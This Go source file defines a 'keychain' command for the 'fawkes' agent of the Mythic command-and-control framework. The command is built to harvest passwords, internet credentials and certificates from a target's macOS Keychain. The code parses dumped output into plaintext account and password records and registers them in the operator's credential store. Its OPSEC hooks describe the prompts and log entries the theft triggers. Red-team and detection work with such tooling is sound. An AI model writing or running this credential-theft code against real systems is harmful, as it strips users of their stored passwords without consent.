package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "keychain",
		Description:         "Access macOS Keychain — list keychains, dump metadata, find passwords and certificates",
		HelpString:          "keychain -action <list|dump|find-password|find-internet|find-cert> [-service <name>] [-server <host>] [-account <user>] [-name <cert-name>]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.001"}, // Credentials from Password Stores: Keychain
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "dump", "find-password", "find-internet", "find-cert"},
				Description:      "list: enumerate keychains, dump: dump metadata, find-password: search generic passwords, find-internet: search internet passwords, find-cert: search certificates",
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "service",
				ModalDisplayName: "Service",
				CLIName:          "service",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Service name to search for (find-password). Example: Wi-Fi, Chrome Safe Storage",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:                 "server",
				ModalDisplayName:     "Server",
				CLIName:              "server",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "Server hostname to search for (find-internet). Example: github.com",
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "account",
				ModalDisplayName: "Account",
				CLIName:          "account",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Account name to search for (find-password, find-internet)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "label",
				ModalDisplayName: "Label",
				CLIName:          "label",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Label to search for (find-password, find-internet)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "name",
				ModalDisplayName: "Certificate Name",
				CLIName:          "name",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Certificate common name to search for (find-cert). Leave empty to list all certificates.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			if action != "find-password" && action != "find-internet" {
				return response
			}
			// Parse macOS security command output for password entries
			// Format: "password: \"value\"" or "password: 0x..." lines
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			var account, service string
			for _, line := range strings.Split(responseText, "\n") {
				line = strings.TrimSpace(line)
				if strings.Contains(line, `"acct"`) && strings.Contains(line, "=") {
					parts := strings.SplitN(line, "=", 2)
					if len(parts) == 2 {
						account = strings.Trim(strings.TrimSpace(parts[1]), `"`)
					}
				} else if strings.Contains(line, `"svce"`) && strings.Contains(line, "=") {
					parts := strings.SplitN(line, "=", 2)
					if len(parts) == 2 {
						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
					}
				} else if strings.Contains(line, `"srvr"`) && strings.Contains(line, "=") {
					parts := strings.SplitN(line, "=", 2)
					if len(parts) == 2 {
						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
					}
				} else if strings.HasPrefix(line, "password:") {
					pass := strings.TrimSpace(strings.TrimPrefix(line, "password:"))
					pass = strings.Trim(pass, `"`)
					if pass != "" && !strings.HasPrefix(pass, "0x") && account != "" {
						realm := hostname
						if service != "" {
							realm = service
						}
						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
							CredentialType: "plaintext",
							Realm:          realm,
							Account:        account,
							Credential:     pass,
							Comment:        fmt.Sprintf("keychain (%s)", action),
						})
					}
				}
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := "OPSEC WARNING: Accessing macOS Keychain. "
			switch action {
			case "dump":
				msg += "Dumping all keychain metadata. May trigger macOS security prompts if accessing login keychain items."
			case "find-password", "find-internet":
				msg += "Searching for passwords. macOS may display a system authorization prompt asking the user to allow keychain access."
			case "find-cert":
				msg += "Searching for certificates. Less likely to trigger prompts but accesses the certificate trust store."
			default:
				msg += "Enumerating keychains (low risk)."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: macOS Keychain accessed. Keychain access generates entries in the Unified Log (subsystem: com.apple.securityd). If keychain UI prompts are enabled, the user may see an access dialog. Extracted passwords should be tested promptly.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("%s", action)
			response.DisplayParams = &display
			return response
		},
	})
}
